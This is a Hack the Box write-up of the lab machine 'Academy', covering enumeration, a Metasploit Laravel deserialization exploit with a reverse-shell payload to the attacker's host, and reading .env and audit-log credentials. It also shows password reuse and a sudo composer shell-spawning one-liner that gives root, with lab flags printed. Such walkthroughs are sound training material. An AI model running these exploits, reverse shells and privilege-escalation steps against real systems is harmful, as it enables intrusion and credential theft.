+++
title = "Hack the Box: Academy"
date = 2023-01-11
description = "Hack the Box: Academy"
tags = [
    "Hack the Box"
]
categories = [
    "Hack the Box"
]
series = ["Hack the Box"]
+++

Hack the Box: Academy
<!--more-->

# Academy

## Enumeration

### Nmap

```
# sudo nmap -p- -Pn -T4 -O -sC -sV 10.10.10.215 -nvv

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

We can find the next page [http://academy.htb/admin-page.php](http://academy.htb/admin-page.php "http://academy.htb/admin-page.php") through an enumeration with nikto and gobuster/dirbuster. It’s giving a new URL to follow : [http://dev-staging-01.academy.htb/](http://dev-staging-01.academy.htb/ "http://dev-staging-01.academy.htb/")

From there we have access to a traceback/debug page and we can find some interesting information such as:

```
DB_DATABASE 	"homestead"
DB_USERNAME 	"homestead"
DB_PASSWORD 	"secret"
APP_KEY    	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
```

Especially the _Laravel_ _APP_Key_ that we gonna use in a metasploit exploit.

## Foothold

### Reverse shell

```
msf6 exploit(unix/http/laravel_token_unserialize_exec) > options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                             yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.62      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@academy:/var/www/html/htb-academy-dev-01/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

```
$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

```
www-data@academy:/var/www/html/academy$ su cry0l1t3
su cry0l1t3
Password: mySup3rP4s5w0rd!!

$ id
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
$ cat user.txt
cat user.txt
cat: user.txt: No such file or directory
$ ls -la
ls -la
total 280
drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .
drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..
drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app
-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan
drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap
-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json
-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock
drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config
drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database
-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env
-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example
-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes
-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore
-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json
-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml
drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:13 public
-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md
drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources
drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes
-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php
drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage
drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests
drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor
-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js
$ cat /home/cry0l1t3/user.txt
cat /home/cry0l1t3/user.txt
d6769e00799ecac3fc53984b09e15c17
```

## Privilege escalation

Running linpeas script provide those information:

```
[+] Checking for TTY (sudo/su) passwords in logs
Error opening config file (Permission denied)                                                                                                                                                            
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

```
$ su mrb3n
$ mrb3n_Ac@d3my!
```

```
$ TF=$(mktemp -d)
TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo composer --working-dir=$TF run-script x
sudo composer --working-dir=$TF run-script x
[sudo] password for mrb3n: mrb3n_Ac@d3my!

PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id  
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
b6167039363fa783151d71d4dc7a9b2a
```

Or with a composer.json file

![](../../../Attachments/academy1.png)
